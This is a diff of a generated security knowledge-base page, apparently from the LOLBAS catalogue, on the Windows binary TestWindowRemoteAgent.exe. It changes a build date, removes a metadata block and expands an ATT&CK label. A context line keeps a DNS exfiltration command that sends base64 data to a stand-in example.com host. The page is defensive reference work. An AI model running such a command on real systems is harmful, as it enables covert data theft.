@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OtherMSBinaries/Testwindowremoteagent.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Testwindowremoteagent.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OtherMSBinaries"
 aliases:
   - "TestWindowRemoteAgent.exe"
@@ -19,16 +19,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# TestWindowRemoteAgent.exe
-
 TestWindowRemoteAgent.exe is the command-line tool to establish RPC
-
-## Metadata
-
-- Category: OtherMSBinaries
-- Created: 2023-08-21
-- Author: Onat Uzunyayla
-- Source Path: yml/OtherMSBinaries/Testwindowremoteagent.yml
 
 ## Paths
 
@@ -47,7 +38,7 @@ TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
 - Use Case: Attackers may utilize this to exfiltrate data over DNS
 - Privileges: User
 - Operating System: Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048]]
+- ATT&CK: [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048: Exfiltration Over Alternative Protocol]]
 
 ## Detections
 
